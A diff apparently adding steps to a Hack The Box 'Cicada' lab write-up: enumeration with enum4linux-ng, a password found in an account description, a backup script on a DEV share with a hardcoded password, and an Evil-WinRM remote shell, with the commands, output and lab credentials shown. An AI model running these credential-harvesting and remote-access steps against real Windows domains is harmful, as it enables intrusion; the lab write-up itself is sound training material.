@@ -352,3 +352,135 @@ SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:
 
 As we can see from the output, the password worked for the user **michael.wrightson**. This user will be our target for further exploitation.
 
+
+## Further Enumeration with enum4linux-ng
+
+After obtaining access with `michael.wrightson`, I checked to see if I could access shares I didn't previously have access to, but to no avail.
+
+With credentials for `michael.wrightson`, I used `enum4linux-ng` to gather more information about the target system. The command used is shown below:
+
+```bash
+python3 enum4linux-ng.py -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
+
+This provided a lot of information, but what caught my attention was the "Users via RPC" section. Specifically, the user david.orelious had a description that contained what appears to be their password:
+
+```bash
+ ====================================
+|    Users via RPC on 10.10.11.35    |
+ ====================================
+[*] Enumerating users via 'querydispinfo'
+[+] Found 8 user(s) via 'querydispinfo'
+[*] Enumerating users via 'enumdomusers'
+[+] Found 8 user(s) via 'enumdomusers'
+[+] After merging user results we have 8 user(s) total:
+'1104':                                                                                                                              
+  username: john.smoulder                                                                                                            
+  name: (null)                                                                                                                       
+  acb: '0x00000210'                                                                                                                  
+  description: (null)                                                                                                                
+'1105':                                                                                                                              
+  username: sarah.dantelia                                                                                                           
+  name: (null)                                                                                                                       
+  acb: '0x00000210'                                                                                                                  
+  description: (null)                                                                                                                
+'1106':                                                                                                                              
+  username: michael.wrightson                                                                                                        
+  name: (null)                                                                                                                       
+  acb: '0x00000210'                                                                                                                  
+  description: (null)                                                                                                                
+'1108':                                                                                                                              
+  username: david.orelious                                                                                                           
+  name: (null)                                                                                                                       
+  acb: '0x00000210'                                                                                                                  
+  description: Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                   
+'1601':                                                                                                                              
+  username: emily.oscars                                                                                                             
+  name: Emily Oscars                                                                                                                 
+  acb: '0x00000210'                                                                                                                  
+  description: (null)                                                                                                                
+'500':                                                                                                                               
+  username: Administrator                                                                                                            
+  name: (null)                                                                                                                       
+  acb: '0x00000210'                                                                                                                  
+  description: Built-in account for administering the computer/domain                                                                
+'501':                                                                                                                               
+  username: Guest                                                                                                                    
+  name: (null)                                                                                                                       
+  acb: '0x00000214'                                                                                                                  
+  description: Built-in account for guest access to the computer/domain                                                              
+'502':                                                                                                                               
+  username: krbtgt                                                                                                                   
+  name: (null)                                                                                                                       
+  acb: '0x00020011'                                                                                                                  
+  description: Key Distribution Center Service Account                
+```
+We now have another set of credentials to try:
+
+    Username: david.orelious
+    Password: aRt$Lp#7t*VQ!3
+
+With the new user privileges, I returned to check if I could access shares that were previously restricted. Using the following command:
+
+Using the credentials for `david.orelious`, I accessed the `DEV` share, which was previously restricted. I used the following command to connect:
+
+```bash
+smbclient "//10.10.11.35/DEV" -U david.orelious
+```
+After successfully logging in, I ran the dir command and found a powershell file:
+
+```
+
+smb: \> dir
+  .                                   D        0  Thu Mar 14 13:31:39 2024
+  ..                                  D        0  Thu Mar 14 13:21:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 18:28:22 2024
+```
+The PowerShell script named Backup_script.ps1, i downloaded the script:
+
+```powershell
+
+$sourceDirectory = "C:\smb"
+$destinationDirectory = "D:\Backup"
+
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$backupFileName = "smb_backup_$dateStamp.zip"
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+```
+
+This script authenticating as emily.oscars, along with a hardcoded password: Q!3@Lp#M6b*7t*Vt.
+
+using netexec we discovered that we can access Windows Remote Management (WinRM) service as emily.oscars
+```bash
+netexec  winrm cicada.htb -u emily.oscars  -p 'Q!3@Lp#M6b*7t*Vt' --continue-on-success
+WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
+WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
+```
+```
+┌──(mofe㉿mofe)-[~/files/htb/cicada/enum4linux-ng]
+└─$ evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
+cicada\emily.oscars
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
+```
+
+I used Evil-WinRM to establish a remote session as `emily.oscars`
+
+
+
+
+
+
+
